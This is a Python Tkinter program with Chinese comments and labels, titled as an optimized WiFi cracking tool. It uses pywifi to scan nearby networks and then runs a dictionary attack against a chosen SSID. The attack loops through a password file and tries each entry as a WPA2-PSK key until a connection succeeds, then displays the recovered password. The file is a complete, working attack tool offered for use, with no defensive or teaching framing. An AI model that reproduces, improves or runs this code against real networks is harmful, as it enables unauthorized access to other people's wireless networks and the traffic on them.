# -*- coding: utf-8 -*-

from tkinter import *
from tkinter import ttk
import pywifi
from pywifi import const
import time
import tkinter.filedialog
import tkinter.messagebox
import threading
from queue import Queue

class MY_GUI():
    def __init__(self, init_window_name):
        self.init_window_name = init_window_name
        
        # 密码文件路径
        self.get_value = StringVar()
        
        # 获取破解wifi账号
        self.get_wifi_value = StringVar()
        
        # 获取wifi密码
        self.get_wifimm_value = StringVar()
        
        # 状态标志
        self.scanning = False
        self.cracking = False
        
        # 消息队列
        self.message_queue = Queue()
        
        # 初始化WiFi接口
        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0]
        self.iface.disconnect()
        time.sleep(1)
        
        # 检查网卡状态
        if self.iface.status() not in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
            tkinter.messagebox.showwarning("警告", "无线网卡未处于断开状态")
    
    def __str__(self):
        return '(WIFI:%s,%s)' % (self.wifi, self.iface.name())
    
    # 设置窗口
    def set_init_window(self):
        self.init_window_name.title("WiFi破解工具 - 优化版")
        self.init_window_name.geometry('+500+200')
        
        # 主框架
        main_frame = Frame(self.init_window_name)
        main_frame.pack(padx=10, pady=10, fill=BOTH, expand=True)
        
        # 配置区域
        config_frame = LabelFrame(main_frame, text="配置", padx=5, pady=5)
        config_frame.pack(fill=X, pady=(0, 10))
        
        # 按钮区域
        button_frame = Frame(config_frame)
        button_frame.pack(fill=X, pady=5)
        
        Button(button_frame, text="搜索附近WiFi", command=self.start_scan_thread).pack(side=LEFT, padx=5)
        Button(button_frame, text="开始破解", command=self.start_crack_thread).pack(side=LEFT, padx=5)
        Button(button_frame, text="停止", command=self.stop_operations).pack(side=LEFT, padx=5)
        
        # 文件选择区域
        file_frame = Frame(config_frame)
        file_frame.pack(fill=X, pady=5)
        
        Label(file_frame, text="密码文件路径:").pack(side=LEFT)
        Entry(file_frame, width=30, textvariable=self.get_value).pack(side=LEFT, padx=5)
        Button(file_frame, text="浏览", command=self.add_mm_file).pack(side=LEFT)
        
        # WiFi信息区域
        wifi_frame = Frame(config_frame)
        wifi_frame.pack(fill=X, pady=5)
        
        Label(wifi_frame, text="WiFi账号:").pack(side=LEFT)
        Entry(wifi_frame, width=25, textvariable=self.get_wifi_value).pack(side=LEFT, padx=5)
        Label(wifi_frame, text="WiFi密码:").pack(side=LEFT, padx=(10, 0))
        Entry(wifi_frame, width=15, textvariable=self.get_wifimm_value, state='readonly').pack(side=LEFT)
        
        # WiFi列表区域
        list_frame = LabelFrame(main_frame, text="WiFi列表")
        list_frame.pack(fill=BOTH, expand=True)
        
        # 树形表格
        self.wifi_tree = ttk.Treeview(list_frame, columns=("id", "ssid", "bssid", "signal"), show="headings")
        self.wifi_tree.heading("id", text="ID")
        self.wifi_tree.heading("ssid", text="SSID")
        self.wifi_tree.heading("bssid", text="BSSID")
        self.wifi_tree.heading("signal", text="信号强度")
        
        self.wifi_tree.column("id", width=50, anchor="center")
        self.wifi_tree.column("ssid", width=150, anchor="center")
        self.wifi_tree.column("bssid", width=150, anchor="center")
        self.wifi_tree.column("signal", width=80, anchor="center")
        
        # 滚动条
        v_scroll = ttk.Scrollbar(list_frame, orient="vertical", command=self.wifi_tree.yview)
        self.wifi_tree.configure(yscrollcommand=v_scroll.set)
        
        # 布局
        self.wifi_tree.pack(side=LEFT, fill=BOTH, expand=True)
        v_scroll.pack(side=RIGHT, fill=Y)
        
        # 绑定双击事件
        self.wifi_tree.bind("<Double-1>", self.onDBClick)
        
        # 状态栏
        self.status_var = StringVar()
        self.status_var.set("就绪")
        Label(main_frame, textvariable=self.status_var, bd=1, relief=SUNKEN, anchor=W).pack(fill=X)
        
        # 定期检查消息队列
        self.init_window_name.after(100, self.process_queue)
    
    def process_queue(self):
        """处理消息队列中的消息"""
        try:
            while not self.message_queue.empty():
                msg = self.message_queue.get_nowait()
                if msg.startswith("STATUS:"):
                    self.status_var.set(msg[7:])
                elif msg.startswith("ALERT:"):
                    tkinter.messagebox.showinfo("提示", msg[6:])
                elif msg.startswith("ERROR:"):
                    tkinter.messagebox.showerror("错误", msg[6:])
        finally:
            self.init_window_name.after(100, self.process_queue)
    
    def start_scan_thread(self):
        """启动扫描线程"""
        if not self.scanning:
            self.scanning = True
            self.status_var.set("正在扫描WiFi...")
            threading.Thread(target=self.scans_wifi_list, daemon=True).start()
    
    def start_crack_thread(self):
        """启动破解线程"""
        if not self.cracking and not self.scanning:
            if not self.get_value.get():
                self.message_queue.put("ERROR:请先选择密码字典文件")
                return
            if not self.get_wifi_value.get():
                self.message_queue.put("ERROR:请先选择或输入WiFi账号")
                return
            
            self.cracking = True
            self.status_var.set("正在破解WiFi...")
            threading.Thread(target=self.readPassWord, daemon=True).start()
    
    def stop_operations(self):
        """停止所有操作"""
        self.scanning = False
        self.cracking = False
        self.status_var.set("操作已停止")
    
    # 搜索wifi
    def scans_wifi_list(self):
        """扫描周围wifi列表"""
        if self.scanning:
            try:
                self.message_queue.put("STATUS:正在扫描附近WiFi...")
                
                # 清空现有列表
                self.wifi_tree.delete(*self.wifi_tree.get_children())
                
                # 开始扫描
                self.iface.scan()
                
                # 动态更新进度
                for i in range(15):
                    if not self.scanning:
                        break
                    time.sleep(1)
                    self.message_queue.put(f"STATUS:扫描中... ({i+1}/15秒)")
                
                if self.scanning:
                    # 获取扫描结果
                    scanres = self.iface.scan_results()
                    nums = len(scanres)
                    self.message_queue.put(f"STATUS:发现 {nums} 个WiFi热点")
                    
                    # 显示结果
                    self.show_scans_wifi_list(scanres)
            except Exception as e:
                self.message_queue.put(f"ERROR:扫描失败: {str(e)}")
            finally:
                self.scanning = False
                if not self.cracking:
                    self.message_queue.put("STATUS:扫描完成")
    
    # 显示wifi列表
    def show_scans_wifi_list(self, scans_res):
        """显示扫描结果"""
        for index, wifi_info in enumerate(scans_res):
            if not self.scanning:  # 如果用户停止了扫描
                break
            
            # 处理SSID编码问题
            ssid = wifi_info.ssid
            if isinstance(ssid, bytes):
                try:
                    # 尝试UTF-8解码
                    ssid = ssid.decode('utf-8')
                except UnicodeDecodeError:
                    try:
                        # 尝试GBK解码
                        ssid = ssid.decode('gbk')
                    except UnicodeDecodeError:
                        # 最后尝试忽略错误
                        ssid = ssid.decode('utf-8', errors='ignore')
            
            # 插入到树形表中
            self.wifi_tree.insert("", 'end', values=(
                index + 1,
                ssid,
                wifi_info.bssid,
                wifi_info.signal
            ))
    
    # 添加密码文件目录
    def add_mm_file(self):
        """选择密码字典文件"""
        filename = tkinter.filedialog.askopenfilename(
            title="选择密码字典文件",
            filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")]
        )
        if filename:
            self.get_value.set(filename)
    
    # Treeview绑定事件
    def onDBClick(self, event):
        """双击选择WiFi"""
        selected = self.wifi_tree.selection()
        if selected:
            self.get_wifi_value.set(self.wifi_tree.item(selected, "values")[1])
    
    # 读取密码字典，进行匹配
    def readPassWord(self):
        """破解WiFi密码"""
        if self.cracking:
            try:
                file_path = self.get_value.get()
                target_ssid = self.get_wifi_value.get()
                
                self.message_queue.put("STATUS:正在读取密码字典...")
                
                with open(file_path, "r", errors="ignore") as f:
                    for line_num, pwd_str in enumerate(f, 1):
                        if not self.cracking:
                            break
                        
                        pwd_str = pwd_str.strip()
                        if not pwd_str:
                            continue
                        
                        self.message_queue.put(f"STATUS:尝试第 {line_num} 个密码: {pwd_str}")
                        
                        if self.connect(pwd_str, target_ssid):
                            self.get_wifimm_value.set(pwd_str)
                            self.message_queue.put(f"ALERT:破解成功! WiFi: {target_ssid} 密码: {pwd_str}")
                            break
                        
                        # 稍微延迟，避免系统过载
                        time.sleep(0.3)
                    
                    if self.cracking and not self.get_wifimm_value.get():
                        self.message_queue.put("ALERT:字典遍历完毕，未找到匹配密码")
            except Exception as e:
                self.message_queue.put(f"ERROR:破解过程中出错: {str(e)}")
            finally:
                self.cracking = False
                self.message_queue.put("STATUS:破解完成")
    
    # 对wifi和密码进行匹配
    def connect(self, pwd_Str, wifi_ssid):
        """尝试连接WiFi"""
        try:
            profile = pywifi.Profile()
            profile.ssid = wifi_ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = pwd_Str
            
            # 移除所有配置并添加新配置
            self.iface.remove_all_network_profiles()
            tmp_profile = self.iface.add_network_profile(profile)
            
            # 尝试连接
            self.iface.connect(tmp_profile)
            
            # 缩短等待时间
            for _ in range(5):
                if not self.cracking:
                    self.iface.disconnect()
                    return False
                
                if self.iface.status() == const.IFACE_CONNECTED:
                    return True
                time.sleep(1)
            
            return False
        finally:
            # 确保断开连接
            self.iface.disconnect()
            time.sleep(0.5)

def gui_start():
    init_window = Tk()
    ui = MY_GUI(init_window)
    ui.set_init_window()
    init_window.mainloop()

if __name__ == "__main__":
    gui_start()